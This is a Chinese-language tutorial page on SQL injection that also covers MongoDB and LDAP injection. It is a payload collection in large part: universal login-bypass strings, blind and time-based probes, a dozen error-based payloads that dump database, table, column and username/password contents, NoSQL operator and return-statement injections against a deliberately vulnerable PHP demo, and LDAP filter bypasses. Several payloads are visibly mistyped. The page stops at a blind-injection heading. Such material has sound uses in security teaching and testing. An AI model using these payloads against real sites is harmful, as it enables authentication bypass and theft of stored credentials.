<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>SQL注入详解 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SQL注入详解</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    
                        
                    
                    <h1>
<a id="SQL_0"></a>SQL注入详解</h1> 
<h2>
<a id="1SQL_2"></a>1.SQL注入简介</h2> 
<p>​ SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。</p> 
<p>​ Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一</p> 
<h2>
<a id="2_sql__8"></a>2. sql 注入产生原因及威胁</h2> 
<p>​ 当我们访问动态网页时, Web 服务器会向数据访问层发起 Sql 查询请求，如果权限验证通过就会执行 Sql 语句。这种网站内部直接发送的Sql请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造 Sql 语句，如果用户输入的数据被构造成恶意 Sql 代码，Web 应用又未对动态构造的 Sql 语句使用的参数进行审查，则会带来意想不到的危险。</p> 
<p>Sql 注入带来的威胁主要有如下几点</p> 
<ul>
<li>猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息。</li>
<li>绕过认证，列如绕过验证登录网站后台。</li>
<li>注入可以借助数据库的存储过程进行提权等操作</li>
</ul> 
<h2>
<a id="3_SQL_18"></a>3. SQL注入漏洞对于数据安全的影响</h2> 
<ul>
<li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</li>
<li>网页篡改：通过操作数据库对特定网页进行篡改。</li>
<li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li>
<li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li>
<li>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li>
<li>破坏硬盘数据，瘫痪全系统。</li>
</ul> 
<h2>
<a id="4SQL_27"></a>4.SQL注入分类及判断</h2> 
<pre><code>基础sql语句

select database(); #查看当前库名; 

select table_name from information_schema.tables where table_schema=database() 

; #查看当前库下的表名 

select column_name from information_schema.columns where table_schema=database() 

and table_name='user'; #查询列名 

select name,password from user; #获取用户名和密码列
</code></pre> 
<h3>
<a id="1_45"></a>1.按数据类型分类</h3> 
<h4>
<a id="_47"></a>①数字型注入点</h4> 
<p>​ 在 Web 端大概是 http://xxx.com/news.php?id=1 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。这一类的 SQL 语句原型大概为</p> 
<pre><code>select * from 表名 where id=1。组合出来的sql注入语句为：select * from news where id=1 and 1=1
</code></pre> 
<h4>
<a id="_55"></a>②字符型注入点</h4> 
<p>​ 在 Web 端大概是 http://xxx.com/news.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为</p> 
<pre><code>select * from 表名 where name='admin'注意多了引号。组合出来的sql注入语句为：select * from news where chr='admin' and 1=1 ' '
</code></pre> 
<h4>
<a id="_63"></a>③搜索型注入点</h4> 
<p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：</p> 
<pre><code>select * from 表名 where 字段 like '%关键字%'`。

组合出来的sql注入语句为：
select * from news where search like '%测试 %' and '%1%'='%1%'

测试%' union select 1,2,3,4 and '%'='
</code></pre> 
<h3>
<a id="2_76"></a>2.按照数据提交的方式来分类</h3> 
<h4>
<a id="GET__78"></a>①GET 注入</h4> 
<p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code> , id 是注入点。</p> 
<h4>
<a id="POST__82"></a>②POST 注入</h4> 
<p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，post提交方式主要适用于表单的提交，用于登录框的注入。</p> 
<pre><code>常用的万能username语句：
 a ’ or 1=1 #
 a ") or 1=1 #
 a‘) or 1=1 #
 a” or “1”=”1
 ' or '1'='1
 ' or (length(database())) = 8  (用于输入’ “都没有错误)
 ' or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)
 ") or ("1")=("1
 ") or 1=1 or if(1=1, sleep(1), null)  #
 ") or (length(database())) = 8 #
 ") or (ascii(substr((select database()) ,1,1))) = 115  or if(1=1, sleep(1), null)  #

</code></pre> 
<p><strong>post型盲注通杀payload：</strong></p> 
<pre><code>uname=admin%df'or()or%200%23&amp;passwd=&amp;submit=Submit
</code></pre> 
<h4>
<a id="Cookie__108"></a>③Cookie 注入</h4> 
<p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。有报错信息可以利用报错注入</p> 
<h4>
<a id="HTTP__112"></a>④HTTP 头部注入</h4> 
<p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p> 
<pre><code>User-Agent:.........' or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #
Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #
Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #
</code></pre> 
<p><strong>User-Agent注入</strong></p> 
<pre><code>User-Agent:1' and updatexml(1,concat(0xx5e,version(),0x5e),1) and '1'='1
</code></pre> 
<p><strong>Referer 注入</strong></p> 
<pre><code>1' and updatexml(1,concat(0x5e,version(),0x5e),1) and '1'='1
</code></pre> 
<p><strong>X-Forwarded-For注入</strong><br> X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<br> 如果系统采用了服务器后端获取 X-Forwarded-For数据，如：利用</p> 
<pre><code>String ip = request.getHeader("X-Forwarded-For")
</code></pre> 
<p>进行获取ip，攻击者可以通过X-Forwarded-For请求头信息就行伪造ip，当然了这个ip<br> 也可以是一些注入语句，如下：</p> 
<pre><code>X-Forwarded-For：1 and if(now()=sysdate(),sleep(6),0)--
String sql = "select * from table where ip = '"+ip+"'";
</code></pre> 
<p>构造X-Forwoarded-For头进行测试，http响应出现变化</p> 
<pre><code>X-Forwarded-For: -1' OR 3*2*1=6 AND 000958=000958--
X-Forwarded-For: -1' OR 3*2*1=6 AND 000958=000957--
</code></pre> 
<h4>
<a id="Request_157"></a>⑤Request方式注入</h4> 
<p>概念：超全局变量 PHP中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可以用，这些超全局变量是：<br> $_REQUEST（获取GET/POST/COOKIE）COOKIE在新版本已经无法获取了<br> $_POST（获取POST传参）<br> $_GET（获取GET传参）<br> $_COOKIE（获取COOKIE传参）<br> $_SERVER（包含了诸如头部信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）</p> 
<h3>
<a id="3_166"></a>3.按照执行效果来分类</h3> 
<h4>
<a id="_168"></a>①基于布尔的盲注，</h4> 
<p>即可以根据返回页面判断条件真假的注入。盲注是注入的一种，指的是在不知道<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE&amp;spm=1001.2101.3001.7020">数据</a>库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注</p> 
<pre><code>Length（）函数 返回字符串的长度
Substr（）截取字符串
Ascii（）返回字符的ascii码
sleep(n)：将程序挂起一段时间 n为n秒
if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
</code></pre> 
<p>布尔型：页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p> 
<pre><code>?id=1' and length(database())&gt;5--+
将&gt;号掉个方向看结果有没有变化，来判断布尔盲注有没有用，后面就继续猜表名，列名，然后内容。
</code></pre> 
<pre><code>http://127.0.0.1/Less-8/?id=1'and (length(database()))&gt;10 --+
and select length(database())&gt;n //判断数据库名长度
and ascii(substr(database(),m,1))&gt;n //截取数据库名第m个字符并转换成ascii码 判断具体值
</code></pre> 
<p>当前数据库database（）的长度大于10，返回true页面，否则FALSE页面</p> 
<p>报错型：构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）</p> 
<h4>
<a id="_200"></a>②基于时间的盲注，</h4> 
<p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p> 
<p>在SQL注入过程中，无论注入是否成功，页面完全没有变化。此时只能通过使用数据库的延时函数来判断注入点一般采用响应时间上的差异来判断是否存在SQL注入，即基于时间型的SQL盲注</p> 
<pre><code class="prism language-bash"><span class="token keyword">select</span> id,name from product where <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">1</span> and sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
</code></pre> 
<h4>
<a id="_210"></a>③基于报错注入，</h4> 
<p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p> 
<pre><code>根据报错信息'1'' LIMIT 0,1`分析SQL查询语句为select … from …where id='input'
</code></pre> 
<p><strong>concat+rand()+group_by()导致主键重复</strong></p> 
<p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</p> 
<p>rand()：</p> 
<pre><code>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字
</code></pre> 
<p>floor()：</p> 
<pre><code>对任意正或者负的十进制值向下取整
</code></pre> 
<p>通常利用这两个函数的方法是floor(rand(0))*2 ,其会生成0和1两个数<br> <strong>常见的12种报错注入+万能语句为:</strong></p> 
<pre><code>通过floor报错,注入语句如下:
and select 1 from (select count(*),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);
</code></pre> 
<pre><code>通过ExtractValue报错,注入语句如下:
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
</code></pre> 
<pre><code>通过UpdateXml报错,注入语句如下:
and 1=(updatexml(1,concat(0x7e,(select user()),0x7e),1))
</code></pre> 
<pre><code>通过NAME_CONST报错,注入语句如下:
and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
</code></pre> 
<pre><code>通过join报错,注入语句如下:
select * from(select * from mysql.user ajoin mysql.user b)c;
</code></pre> 
<pre><code>通过exp报错,注入语句如下:
and exp(~(select * from (select user () ) a) );
</code></pre> 
<pre><code>通过GeometryCollection()报错,注入语句如下:
and GeometryCollection(()select *from(select user () )a)b );
</code></pre> 
<pre><code>通过polygon ()报错,注入语句如下:
and polygon (()select * from(select user ())a)b );
</code></pre> 
<pre><code>通过multipoint ()报错,注入语句如下:
and multipoint (()select * from(select user() )a)b );
</code></pre> 
<pre><code>通过multlinestring ()报错,注入语句如下:
and multlinestring (()select * from(selectuser () )a)b );
</code></pre> 
<pre><code>通过multpolygon ()报错,注入语句如下:
and multpolygon (()select * from(selectuser () )a)b );
</code></pre> 
<pre><code>通过linestring ()报错,注入语句如下:
and linestring (()select * from(select user() )a)b );
</code></pre> 
<p>为了使结构能够更方便的查看，可以在concat()中添加一些内容</p> 
<pre><code>?id=2' and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ 

and (select 1 from (select count(*),concat(((select schema_name from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ 
</code></pre> 
<p>之后还是将select语句改为一般的注入语句就可以</p> 
<pre><code>爆数据库名：?id=2' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+

爆表名：?id=2' and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2))x from information_schema.tables group by x)a)--+

爆列名：?id=2' and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name="TABLE_NAME" limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+

爆数据：?id=2' and (select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+

?id=1' and (select 1 from (select count(*),concat((Select concat_ws(0x3a,username,password) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+

</code></pre> 
<p>不能使用group_concat函数时，使limit语句来限制查询结果的列数</p> 
<p><strong>updatexml报错注入</strong></p> 
<pre><code>爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)
爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)
爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)
爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)

</code></pre> 
<h4>
<a id="_331"></a>④联合查询注入，</h4> 
<p>可以使用union的情况下的注入。</p> 
<h4>
<a id="_335"></a><strong>⑤二次注入</strong>
</h4> 
<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p> 
<p>注入步骤：</p> 
<p>第一步：插入恶意数据<br> 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p> 
<p>第二步：引用恶意数据<br> 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p> 
<h4>
<a id="_347"></a>⑥堆查询注入，</h4> 
<p>可以同时执行多条语句的执行时的注入。</p> 
<p>在SQL中，分号（;）是用来表示一条sql语句的结束,堆叠注入可以执行任何人sql语句。但是当API或数据库引擎的不支持，堆叠注入就不能进行啦</p> 
<h3>
<a id="4_353"></a>4.其他类型注入</h3> 
<h4>
<a id="Access_355"></a>①Access偏移注入</h4> 
<p>偏移注入是access比较独有的一种注入手段，很有特点的注入方式，一般用于在猜出了表名但是没有猜出列名的情况下使用。</p> 
<p>**原理：**借用数据库的自连接查询（inner join）让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示。</p> 
<p>**用处：**access偏移注入是解决一些注入不出来列表的时候，同时要求支持union select，列名足够多，需要知道表名。</p> 
<p><strong>利用条件：</strong></p> 
<p>1、知道表名<br> 2、任意字段（一般access会有一个id字段。）</p> 
<p><strong>偏移注入的流程：</strong></p> 
<p>1、 判断字段数</p> 
<p>2、 判断表名</p> 
<p>3、 开始偏移注入</p> 
<p><strong>1、判断注入点</strong></p> 
<pre><code>127.0.0.1/asp/index.asp?id=1513 and 1=1 正常 

127.0.0.1/asp/index.asp?id=1513 and 1=2 错误
</code></pre> 
<p><strong>2、查询字段个数</strong></p> 
<pre><code>127.0.0.1/asp/index.asp?id=1513 order by 22 正常
127.0.0.1/asp/index.asp?id=1513 order by 23 错误
</code></pre> 
<p><strong>3、爆出显位</strong></p> 
<pre><code>127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
</code></pre> 
<p><strong>4、判断表内存在的字段个数</strong></p> 
<pre><code>127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin 错误
127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,* from admin 错误
</code></pre> 
<p>直到…</p> 
<pre><code>127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确
</code></pre> 
<p>说明了admin表下有6个字段；</p> 
<p>用"<em>"代表 admin 表的字段数，计算</em>代替字符的位数。</p> 
<p><strong>5、爆列名数据</strong></p> 
<p><strong>一级偏移语句：</strong></p> 
<pre><code>127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)
</code></pre> 
<p>如果你发现，上面查看了网页源码也爆不出数据，请用以下方法：</p> 
<p><strong>二级偏移语句：</strong></p> 
<pre><code>127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join a
</code></pre> 
<p><strong>偏移注入的基本公式为:</strong></p> 
<p>​ <strong>order by 出的字段数减去号的字段数</strong>，然而再用order by的字段数减去<strong>2倍刚才得出来的答案</strong></p> 
<h4>
<a id="MongoDB__436"></a>②MongoDB 注入</h4> 
<p><strong>简介</strong>：MongoDB是一个基于分布式文件存储的数据库，是一个介于关系数据库和非关系数据库之间的产品，它的特点是高性能、易部署、易使用，存储数据非常方便，默认情况下是没有认证的这就导致不熟悉它的研发人员部署后没有做访问控制导致可以未授权登录。</p> 
<p>MongoDB 与几乎支持相同语法的SQL数据库相反，NoSQL数据库具有不同的语法。</p> 
<p><strong>实现MongoDB 注入：</strong></p> 
<p>在登录时，如果是mysql这种关系型的数据库，我们可以构造真值等式来绕过。如 or 1=1。 在nosql中同样可以，nosql中的 || 1==1 相当于在sql中的 or 1=1 。 那么我们可以这样绕过：</p> 
<pre><code>username=fujieace' || 1==1 //
</code></pre> 
<p>在攻击前，我们需要先建立一个集合，作为攻击的基础。</p> 
<p>用户test是攻击者已经知道账号密码的一个测试账号，其他账号的话密码随机。想通过注入获取其他账号的密码。</p> 
<p><strong>1.数组绑定时的注入</strong></p> 
<p>一个数组绑定的查询demo如下：</p> 
<pre><code>#!php
&lt;?php
$mongo = new mongoclient();
$db = $mongo-&gt;myinfo; //选择数据库
$coll = $db-&gt;test; //选择集合
$username = $_GET['username'];
$password = $_GET['password'];
$data = array(
        'username'=&gt;$username,
        'password'=&gt;$password
        );
$data = $coll-&gt;find($data);
$count = $data-&gt;count();
if ($count&gt;0) {
    foreach ($data as $user) {
        echo 'username:'.$user['username']."&lt;/br&gt;";
        echo 'password:'.$user['password']."&lt;/br&gt;";
    }
}
else{
    echo '未找到';
}
?&gt;
</code></pre> 
<p>此时的攻击利用了php可以传递数组参数的一个特性。</p> 
<p>当传入的url为：</p> 
<p>http://127.0.0.1/2.php?username=test&amp;password=test</p> 
<p>执行了语句：</p> 
<blockquote> 
 <p>db.test.find({username:‘test’,password:‘test’});</p> 
</blockquote> 
<p>如果此时传入的url如下:</p> 
<blockquote> 
 <p>http://127.0.0.1/2.php?username[xx]=test&amp;password=test</p> 
</blockquote> 
<p>则$username就是一个数组，也就相当于执行了php语句：</p> 
<pre><code class="prism language-php"><span class="token comment">#!php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
<span class="token string single-quoted-string">'username'</span><span class="token operator">=&gt;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xx'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token string single-quoted-string">'password'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>此时的攻击利用了php可以传递数组参数的一个特性。</p> 
<p>当传入的url为：</p> 
<pre><code>http://127.0.0.1/2.php?username=test&amp;password=test
</code></pre> 
<p>执行了语句：</p> 
<pre><code>db.test.find({username:'test',password:'test'});
</code></pre> 
<p>如果此时传入的url如下:</p> 
<pre><code>http://127.0.0.1/2.php?username[xx]=test&amp;password=test
</code></pre> 
<p>则$username就是一个数组，也就相当于执行了php语句：</p> 
<pre><code>#!php
$data = array(
'username'=&gt;array('xx'=&gt;'test'),
'password'=&gt;'test');

而mongodb对于多维数组的解析使最终执行了如下语句：

db.test.find({username:{'xx':'test'},password:'test'});
</code></pre> 
<p>利用此特性，我们可以传入数据，是数组的键名为一个操作符（大于，小于，等于，不等于等等），完成一些攻击者预期的查询。</p> 
<p>如，传入url:</p> 
<pre><code>http://127.0.0.1/2.php?username[$ne]=test&amp;password[$ne]=test
</code></pre> 
<p>因为传入的键名$ne正是一个mongodb操作符，最终执行了语句：</p> 
<pre><code>db.test.find({username:{'$ne':'test'},password:{'$ne':'test'}});
</code></pre> 
<p>这句话相当于sql:</p> 
<pre><code>select * from test where username!='test' and password!='test';
</code></pre> 
<p>如果此时的用户名与密码不能回显，只是返回一个逻辑上的正误判断。</p> 
<p>那么我们可以采用$regex操作符来一位一位获取数据。</p> 
<p><strong>2.拼接字符串时的注入</strong></p> 
<p>攻击方式：</p> 
<pre><code>http://127.0.0.1/1.php?username=test'&amp;password=test
</code></pre> 
<p>报错。 想办法闭合语句。</p> 
<pre><code>http://127.0.0.1/1.php?username=test'});return {username:1,password:2}//&amp;password=test
</code></pre> 
<p>该语句能返回一个数组，username键值是1，password键值是2.</p> 
<p>爆mongodb版本</p> 
<pre><code>http://127.0.0.1/1.php?username=test'});return {username:tojson(db.getCollectionNames()),password:2};//&amp;password=test
</code></pre> 
<p>爆所有集合名</p> 
<p>因为db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。并且mongodb函数区分大小写。</p> 
<p>爆test集合的第一条数据</p> 
<pre><code>http://127.0.0.1/1.php?username=test'});return {username:tojson(db.test.find()[0]),password:2};//&amp;password=test
</code></pre> 
<p>爆test集合的第二条数据</p> 
<p>因为execute方法支持多语句执行，所以可以执行太多语句了，不演示~</p> 
<p>当然，有时可能遇到没有输出返回数据，这时候怎么办呢？</p> 
<p>在高版本下，添加了一个函数sleep()，就是时间盲注咯~</p> 
<p>在高版本下，貌似不能用注释语句，此外高版本还有一个新特性就是默认开启错误回显。笔者尝试没有注释成功，只能用闭合的方法。</p> 
<pre><code>http://127.0.0.1/1.php?username=test'});if (db.version() &gt; "0") { sleep(10000); exit; }var b=({a:'1&amp;password=test
</code></pre> 
<h4>
<a id="LDAP_610"></a>③LDAP注入</h4> 
<p><strong>1.LDAP介绍</strong></p> 
<p>​ LDAP不定义客户端和服务端的工作方式，但会定义客户端和服务端的通信方式，另外，LDAP还会定义LDAP数据库的访问权限及服务端数据的格式和属性。LDAP有三种基本的通信机制：没有处理的匿名访问；基本的用户名、密码形式的认证；使用SASL、SSL的安全认证方式。LDAP和其他一些协议走的是同一个套路，基于tcp/ip协议通信，注重服务的可用性、信息的保密性等等，除此之外还要回到那个最原始的问题：信任，当然信息安全的本质问题就是信任的问题。部署了LDAP的应用不会直接访问，目录中的内容，一般通过函数调用或者API，应用可以通过定义的C、Java的API进行访问，Java应用的访问方式为JNDI(Java Naming and Directory Interface)。</p> 
<p>LDAP的URL形式为：</p> 
<pre><code>ldap://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;，&lt;path&gt;:&lt;dn&gt;[?&lt;artribute&gt;[?&lt;scope&gt;?&lt;filter&gt;]]
</code></pre> 
<pre><code> 例如： ldap://austin.ibm.com/ou=Austin,o=IBM    ldap:///ou=Austin,o=IBM??sub?(cn=Joe Q. Public)
</code></pre> 
<p>看得出来在URL中这里使用逗号分隔查询，而数据库查询则使用’&amp;'号，这是LDAP特有的，另外这里o表示组织(organization)，u表示单元(unit)，cn表示country name，</p> 
<p><strong>LDAP注入攻击</strong>和SQL注入攻击相似，因此接下来的想法是利用用户引入的参数生成LDAP查询。一个安全的Web应用在构造和将查询发送给服务器前应该净化用户传入的参数。在有漏洞的环境中，这些参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。</p> 
<p>测试一个应用是否存在代码注入漏洞典型的方法是向服务器发送会生成一个无效输入的请求。因此，如果服务器返回一个错误消息，攻击者就能知道服务器执行了他的查询，他可以利用代码注入技术。回想一下之前讨论的，我们可以将注入环境分为两种：AND注入环境和OR注入环境。</p> 
<p><strong>2.LDAP注入攻击</strong></p> 
<ul><li><strong>AND LDAP注入</strong></li></ul> 
<p>这种情况，应用会构造由”&amp;”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p> 
<pre><code>(&amp;(parameter1=value1)(parameter2=value2))
</code></pre> 
<p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p> 
<p><strong>绕过访问控制</strong></p> 
<p>一个登陆页有两个文本框用于输入用户名和密码，过滤器如下：</p> 
<pre><code class="prism language-lisp"><span class="token punctuation">(</span>&amp;<span class="token punctuation">(</span><span class="token car">USER=Uname</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token car">PASSWORD=Pwd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
</code></pre> 
<p>如果攻击者输入一个有效地用户名，如r00tgrok，然后再这个名字后面注入恰当的语句，password检查就会被绕过。输入<strong>Uname=slisberger)(&amp;))</strong>，得到如下</p> 
<pre><code class="prism language-lisp"><span class="token punctuation">(</span>&amp;<span class="token punctuation">(</span><span class="token car">USER=</span> slisberger<span class="token punctuation">)</span><span class="token punctuation">(</span>&amp;<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token car">PASSWORD=Pwd</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>LDAP服务器只处理第一个过滤器，即仅查询(&amp;(USER=slidberger)(&amp;))得到了处理。这个查询永真,故成功绕过</p> 
<p><strong>权限提升</strong></p> 
<p>现假设下面的查询会向用户列举出所有可见的低安全等级文档：</p> 
<pre><code class="prism language-lisp"><span class="token punctuation">(</span>&amp;<span class="token punctuation">(</span><span class="token car">directory=document</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token car">security_level=low</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
</code></pre> 
<p>这里第一个参数document是用户入口，low是第二个参数的值。如果攻击者想列举出所有可见的高安全等级的文档，他可以利用如下的注入：<strong>document)(security_level=*))(&amp;(directory=documents</strong><br> 得到</p> 
<pre><code class="prism language-lisp"><span class="token punctuation">(</span>&amp;<span class="token punctuation">(</span><span class="token car">directory=documents</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token car">security_level=*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>&amp;<span class="token punctuation">(</span><span class="token car">direcroty=documents</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token car">security_level=low</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>LDAP服务器仅会处理第一个过滤器而忽略第二个，因而只有下面的查询会被处理：</p> 
<pre><code class="prism language-lisp"><span class="token punctuation">(</span>&amp;<span class="token punctuation">(</span><span class="token car">directory=documents</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token car">security_level=*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>结果就是，所有安全等级的可用文档都会列举给攻击者</p> 
<ul><li><strong>OR注入</strong></li></ul> 
<p>这种情况，应用会构造由”|”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p> 
<pre><code class="prism language-lisp"><span class="token punctuation">(</span>|<span class="token punctuation">(</span><span class="token car">parameter1=value1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token car">parameter2=value2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p> 
<p>具体的注入方式和AND差不太多</p> 
<p><strong>3.LDAP盲注</strong></p> 
<p><strong>AND盲注</strong></p> 
